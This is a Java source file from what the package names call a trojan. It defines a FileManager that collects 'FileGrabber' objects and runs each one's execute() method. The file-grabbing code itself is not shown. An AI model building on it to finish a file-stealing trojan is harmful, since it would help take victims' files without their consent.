package dev.px.trojan.Impl;

import dev.px.trojan.Files.FileGrabber;

import java.io.File;
import java.util.ArrayList;

public class FileManager {

    private ArrayList<FileGrabber> loggedFiles;

    public FileManager() {
        this.loggedFiles = new ArrayList<>();
    }

    public void Add(FileGrabber file) {
        this.loggedFiles.add(file);
    }

    public void executeFiles() {
        this.loggedFiles.forEach(file -> {
            try {
                file.execute();
            } catch (Exception e) { e.printStackTrace(); }
        });
    }
}
